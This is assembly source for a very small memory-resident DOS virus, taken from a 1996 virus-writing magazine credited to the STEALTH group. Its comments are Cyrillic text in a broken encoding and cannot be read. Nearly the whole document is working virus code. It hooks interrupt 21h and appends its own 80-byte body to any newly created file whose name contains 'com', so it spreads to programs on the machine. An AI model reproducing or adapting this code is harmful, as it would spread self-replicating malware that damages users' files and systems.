;      ��                  �
;     ���  Virus Magazine  � Box 10, Kiev 148, Ukraine       IV  1996
;     ��� ���������������� � ������������������� � ��������  ��������
;      �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � ���� � 
;       � � � ��  ��  �    �  ��  � �    � � � � � �   �     � ���� �
;       � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � ���� �
;       � ����������������� �������������������������������  ��������
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.

; ��। ���� ��室�� ⥪�� ������ �� ᠬ�� �����쪨� ����ᮢ � ���.
; ��� ����� �⭥�� � RC, �.�. १������, ��ࠦ��騩 COM 
; 䠩�� (䠩�� � ����� ������ ���� ᨬ���� 'co') �� ��
; ᮧ����� �㭪樥� 3Ch. �����ᯮᮡ�� �� ������� 
; �� i286 �� i486 ��� �� ��������.

;                                      (c) Populizer (1996)

	.model	tiny
	.code
	org	100h
start:
	push	si		; si �� ���� = 100h, � �⥪� 100h
	push	si		; �� ���� 100h
	mov	es,bx		; bx �� ���� = 0, ES = 0
	mov	di,2B0h		; ���� ��砫� १����⭮� ��� �����
	cli			; ������� ���뢠��� ( ����� ������
				; ������� �ணࠬ�� )
	cmpsb			; �஢���� �� ����稥 ����� � �����
	jz	loc_2		; �᫨ ����� � ����� ����, � �� ��室
	dec	si		; si = 100h
	dec	di		; di = 2B0h
	mov	cl,50h		; cl = 80
				; ch ����� ���� <> 0 (������⮪)
	rep	movsb		; ��।��� �� ����� 0:2B0 80 ����
	mov	si,21h*4	; si 㪠�뢠�� �� ���� int 21h
	push	si		; ��࠭�� si
; ������� ᥣ���� � ᬥ饭�� int 21 � 墮�� �����
	movs	word ptr es:[di],word ptr es:[si]	; es: movsw
	movs	word ptr es:[di],word ptr es:[si]	; es: movsw
	pop	di		; di = 84h
	mov	al,2Bh		; ah = 0, ax = 2Bh
	stosw			; ����� ���祭�� ��� int 21h -> 2B:2B
	stosw
loc_2:
	pop	di		; di = 100h
	lea	si,[di+50h]	; si = 150h
	mov	cx,sp		; cx = 0FFFCh
	sub	cx,si		; cx = 0FFFEh-150h
	push	cs		; ES = CS
	pop	es
	rep	movsb		; ������� ��஥ ⥫� ����
	retn			; ��� �⮩ ������樨 � �����
				; 㦥 �� �㤥�, ⥬ �� ����� ���
				; �믮������� �� ������� i286-i486.
				; �� ⠪ ���뢠��� '��䥪� ������'.
; ���� ��ࠡ��稪 21-�� ���뢠���
;	org	12Bh
	cmp	ah,3Ch		; �㭪�� ᮧ����� 䠩�� ?
	jne	loc_5		; �᫨ ��� - �� ��室
; DS:DX - 㪠�뢠�� �� ��� ������ 䠩��
; CX    - ��ਡ�� 䠩�� ����� ���� �� 0 �� 27h
	int	0C0h		; �᫨ (2B0h+50h)/4 = 0C0h, �.�. ����
				; ��ண� ��ࠡ��稪� int 21h
	push	ax		; �������� ax � �⥪�
	xchg	bx,ax		; bx = ax
	mov	si,dx		; si = dx

locloop_3:
	dec	si
	lodsw
	cmp	ax,'mo'		; ���� ᨬ����� 'om' � ����� 䠩��
	loopnz	locloop_3	; �த������ ���� zf=0 � cx<>0
	jnz	loc_4		; �᫨ ᨬ����� ���, � �� ��ࠦ���
	push	ds		; ��������� ds
	push	cs		; ds = cs
	pop	ds
	mov	ah,40h		; �㭪�� ������ � 䠩�
	mov	cl,50h		; cx = 80
	cwd			; dx = sign(ax) = 0
	int 	21h		; ������� cx ���� �� ����� ds:dx
	pop	ds		; ����⠭����� ds
loc_4:
	pop	ax		; ����⠭����� ax
	clc
	retf	2
loc_5:
	db	0EAh		; ��� ������� jmp far
; ��砫� 䠩��-�����
	int	20h		; ����� �࠭����� ᥣ���� � ᬥ饭�� 
				; ��ண� int 21h
end	start
